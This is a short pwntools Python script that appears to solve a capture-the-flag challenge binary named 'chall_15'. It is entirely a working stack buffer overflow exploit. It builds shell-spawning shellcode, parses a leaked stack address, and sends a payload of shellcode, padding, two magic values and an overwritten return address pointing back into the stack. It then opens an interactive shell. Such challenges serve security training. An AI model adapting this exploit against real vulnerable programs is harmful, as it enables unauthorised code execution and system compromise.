from pwn import *
elf = ELF("./chall_15")
context.arch = "amd64"
# Generating shellcode using the shellcraft module, specifically the shellcode for spawning a shell
shellcode = asm(shellcraft.sh())
p = process("./chall_15")
# Receiving data from the process until a newline character ("\n") is encountered and store it in the variable "leak"
p.recvuntil(b'\n')
leak = p.recv()
# Converting the leaked address from hexadecimal to an integer
stackleak = int(leak, 16)
# Crafting the payload: shellcode followed by 232 bytes of 's' characters, then the little-endian representation of the hexadecimal values 0xdeadd00d and 0xb16b00b5, followed by 8 bytes of 's' characters, and finally the little-endian representation of the leaked stack address
payload = shellcode + b's' * 232 + p32(0xdeadd00d) + p32(0xb16b00b5) + b's' * 8 + p64(stackleak)
p.sendline(payload)
p.interactive()

